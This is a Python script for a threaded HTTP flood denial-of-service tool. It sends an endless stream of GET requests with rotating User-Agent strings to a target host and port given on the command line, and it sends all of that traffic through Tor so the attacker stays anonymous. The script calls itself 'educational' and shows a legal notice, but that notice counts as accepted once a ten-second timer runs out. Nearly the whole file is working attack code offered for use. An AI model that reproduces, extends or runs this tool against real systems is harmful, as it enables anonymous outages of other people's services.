#!/usr/bin/python3
# -*- coding: utf-8 -*-

# Python 3.x Educational DoS Script v.1
# Developed by ABDULLATEF
# For legal and educational purposes only.

import time
import sys
import socket
import threading
import logging
import random
from queue import Queue
from optparse import OptionParser

# Requires: pip install pysocks
import socks 

# *****************************************************************
# ** LEGAL NOTICE AND USAGE TERMS (For Educational Purposes) **
# *****************************************************************

def display_legal_notice():
    """Displays the legal warning and usage terms in English."""
    print("\n" + "="*70)
    print("\033[93mLEGAL AND ETHICAL WARNING - EDUCATIONAL TOOL\033[0m".center(78))
    print("="*70)
    print("\033[96mThis tool is strictly for educational and research purposes\033[0m")
    print("\033[96min certified cybersecurity institutes under expert supervision.\033[0m")
    print("\n\033[91mTERMS OF USE:\033[0m")
    print("1. Explicit written permission from the server owner is mandatory before any testing.")
    print("2. Strictly prohibited to use this tool to target any system or network without authorization.")
    print("3. The developer (ABDULLATEF) and the educational institute bear no legal responsibility")
    print("   for any illegal or unauthorized use of this tool.")
    print("\n\033[92mTor Proxy is integrated to ensure anonymity during training,\033[0m")
    print("\033[92mbut this does not exempt you from legal accountability.\033[0m")
    print("="*70)
    
    # Simple wait loop instead of input() to avoid RuntimeError in non-interactive environment
    print("\n\033[93mStarting in 10 seconds. Please read and accept the terms.\033[0m")
    print("\033[93m(Press Ctrl+C to cancel)\033[0m")
    time.sleep(10)
    print("\n\033[94mImplicit Acceptance: Terms accepted. Launching tool...\033[0m")

# *****************************************************************
# ** CORE TOOL FUNCTIONS **
# *****************************************************************

def user_agent():
    """List of User Agents for request diversification."""
    global uagent
    uagent = []
    uagent.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15")
    uagent.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36")
    uagent.append("Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1")
    uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    return uagent

def down_it(item):
    """Function to send requests via Tor SOCKS Proxy."""
    try:
        while True:
            # Build HTTP GET packet
            packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
            
            # Create Socket and route it through Tor
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050) # Tor SOCKS Proxy
            s.connect((host, int(port)))
            
            if s.sendto(packet, (host, int(port))):
                s.shutdown(1)
                print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m[ABDULLATEF] Request successful via Tor\033[0m")
            else:
                s.shutdown(1)
                print("\033[91m[ABDULLATEF] Failed to send request\033[0m")
            time.sleep(0.1)
    except socks.ProxyError:
        print("\033[91m[Tor Error] Ensure Tor service is running on 127.0.0.1:9050\033[0m")
        time.sleep(5)
    except socket.error as e:
        print("\033[91m[Connection Error] Target server may be down or blocked\033[0m")
        time.sleep(0.1)
    except Exception as e:
        #print(f"\033[91m[General Error] {e}\033[0m")
        time.sleep(0.1)

def dos_thread():
    """Main thread function."""
    while True:
        item = q.get()
        down_it(item)
        q.task_done()

def usage():
    """Displays the tool's usage instructions."""
    print (''' \033[92m
    ================================================================
    |       ABDULLATEF Educational Stress Testing Tool v1.0        |
    ================================================================
    |  NOTE: All requests are routed through Tor Proxy (127.0.0.1:9050) |
    |  The Tor service must be running beforehand in Termux.         |
    ================================================================
    
    Usage: python3 ABDULLATEF_DDoS_Tool.py --server <TARGET_IP> --port <PORT> --threads <THREADS>
    
    Options:
    --server  : Target Server IP or Domain (e.g., 192.168.1.1)
    --port    : Target Port (Default: 80)
    --threads : Number of Threads (Default: 135)
    --help    : Show this help message
    --about   : Show information about the tool and developer
    
    Example:
    python3 ABDULLATEF_DDoS_Tool.py --server 192.168.1.1 --port 80 --threads 200
    \033[0m''')
    sys.exit()

def about():
    """Displays information about the tool and developer."""
    print (''' \033[92m
    ================================================================
    |       ABDULLATEF Educational Stress Testing Tool v1.0        |
    ================================================================
    | Developer: ABDULLATEF                                        |
    | Version: 1.0 (Educational Release)                           |
    | Purpose: Cybersecurity training and stress testing in a      |
    |          controlled, authorized environment.                 |
    | Features: Tor Proxy Integration (SOCKS5: 127.0.0.1:9050)     |
    | License: Educational Use Only. See Terms for details.        |
    ================================================================
    \033[0m''')
    sys.exit()

def get_parameters():
    """Receives command-line arguments."""
    global host
    global port
    global thr
    
    # New developer name
    optp = OptionParser(add_help_option=False, epilog="ABDULLATEF")
    optp.add_option("-q", "--quiet", help="set logging to ERROR", action="store_const", dest="loglevel", const=logging.ERROR, default=logging.INFO)
    
    # Using full words for options as requested
    optp.add_option("--server", dest="host", help="Target server IP or domain")
    optp.add_option("--port", type="int", dest="port", help="Target port (default 80)")
    optp.add_option("--threads", type="int", dest="turbo", help="Number of threads (default 135)")
    optp.add_option("--help", dest="help", action='store_true', help="Show this help message")
    optp.add_option("--about", dest="about", action='store_true', help="Show information about the tool and developer")
    
    opts, args = optp.parse_args()
    logging.basicConfig(level=opts.loglevel, format='%(levelname)-8s %(message)s')
    
    if opts.help:
        usage()
    
    if opts.about:
        about()
    
    if opts.host is not None:
        host = opts.host
    else:
        usage()
        
    port = opts.port if opts.port is not None else 80
    thr = opts.turbo if opts.turbo is not None else 135

# *****************************************************************
# ** ENTRY POINT **
# *****************************************************************

# Read headers file or use default value
try:
    with open("headers.txt", "r") as headers_file:
        data = headers_file.read()
except FileNotFoundError:
    data = "Accept-Language: en-us,en;q=0.5\nConnection: keep-alive\n"
    print("\033[93m[Warning] headers.txt file not found. Using default headers.\033[0m")

# Task queue
q = Queue()

if __name__ == '__main__':
    if len(sys.argv) < 2:
        usage()
        
    get_parameters()
    display_legal_notice() # Display legal warning before starting
    user_agent()
    
    print("\033[92m[Info] Target Host: \033[0m", host, "\033[92m| Port: \033[0m", str(port), "\033[92m| Threads: \033[0m", str(thr))
    print("\033[94m[Status] Checking initial connection...\033[0m")
    
    # Initial connection check via Tor
    try:
        s = socks.socksocket()
        s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
        s.connect((host, int(port)))
        s.settimeout(1)
        print("\033[92m[Success] Initial connection established via Tor. Starting educational attack...\033[0m")
    except socks.ProxyError:
        print("\033[91m[Fatal Error] Failed to connect to Tor Proxy. Ensure Tor is running on 127.0.0.1:9050.\033[0m")
        sys.exit(1)
    except socket.error as e:
        print("\033[91m[Fatal Error] Failed to connect to target server. Check IP and Port.\033[0m")
        sys.exit(1)
    
    # Start threads
    for i in range(int(thr)):
        t = threading.Thread(target=dos_thread)
        t.daemon = True
        t.start()
        
    # Fill task queue
    item = 0
    while True:
        if (item > 1800): # To prevent memory consumption
            item = 0
            time.sleep(0.1)
        item = item + 1
        q.put(item)
        
    q.join() # Wait for all tasks to complete (will not happen in this type of tool)
